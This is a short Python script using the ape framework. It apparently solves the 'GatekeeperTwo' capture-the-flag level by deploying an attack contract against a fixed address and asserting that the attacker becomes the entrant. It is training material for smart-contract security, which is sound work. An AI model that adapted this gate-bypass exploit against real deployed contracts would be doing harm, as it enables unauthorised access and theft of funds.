#!/usr/bin/python3
from ape import accounts, project
from rich.console import Console

ADDRESS = "0x52BBF02eEe3A69Bca77BBb5fd135f696D359Bbc7"

console = Console()


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.GatekeeperTwo.at(ADDRESS)

    console.print(f"[green]Entrant Before The Hack: [magenta]{target_contract.entrant()}")
    #* Ignore the contract container
    _ = project.GatekeeperTwoAttack.deploy(target_contract.address, sender=attacker)

    console.print(f"[green]Entrant After The Hack: [magenta]{target_contract.entrant()}")

    assert target_contract.entrant() == attacker.address



def main():
    attack()


if __name__ == "__main__":
    main()